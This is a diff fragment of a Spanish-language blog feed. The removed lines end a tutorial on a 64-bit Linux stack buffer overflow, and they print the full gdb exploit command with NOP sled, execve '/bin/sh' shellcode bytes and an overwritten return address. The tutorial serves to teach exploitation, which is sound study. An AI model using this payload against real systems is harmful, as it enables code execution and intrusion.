-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Por ultimo le pasaremos 8 bytes mas para sobreescribir el RIP y el payload queda asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 76 bytes +  24 bytes + 20 bytes + 8 bytes = 128 bytes
-|---------|-----------|----------|--------|
-|  junk   | shellcode | padding  |  RIP   |
-|---------|-----------|----------|--------|
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Pasemos a ejecutar el binario en pwndbg de la siguiente manera:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r $(python2 -c &quot;print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'B'*8&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Vemos la misma historia, se ocasiono el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segmentation fault&lt;/code&gt; y nuestro RIP vale &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4242424242424242&lt;/code&gt; que son las 8 B que le indicamos.&lt;/p&gt;
-
-&lt;p&gt;Para ver si nuestra shellcode esta en la memoria mostraremos 100 bytes del rsp menos 200 con el siguiente comando en gdb:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/100wx $rsp-200&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto nos debe de mostar algo como esto, donde la parte que esta seleccionada es nuestra shellcode, tambien ahi mismo podemos ver los 76 NOPs del junk, los 20 del padding y los 8 del RIP&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/shellcode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por ultimo para poder ejecutar nuestra shellcode tenemos que cambiar esos 8 bytes del RIP a una direccion que este entre todos los NOPs y donde solo haya NOPs, esa direccion la tenemos que pasar a little endian, yo les recomiendo que usen cualquiera de estas, yo use la que esta seleccionada (es probable que las direcciones que les salgan a ustedes sean diferentes a las mias):&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/ret-shellcode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;El comando para ejecutar en gdb queda de la siguiente forma:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r $(python2 -c &quot;print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'\x90'*20+'\xe0\xdc\xff\xff\xff\x7f\x00\x00'&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y listo, ya obtuvimos una shell!!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/pwn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/bof-stack-based/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="bof" /><category term="gdb" /><summary type="html">Aprenderas a como realizar un simple buffer overflow stack-based en linux de 64 bits</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/images/ret2libc/waifu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="ret2libc" /><category term="gdb" /><category term="bof" /><summary type="html">En este articulo veremos como realizar un ataque con una tecnica llamada ret2libc para hacer bypass del NX</summary></entry></feed>
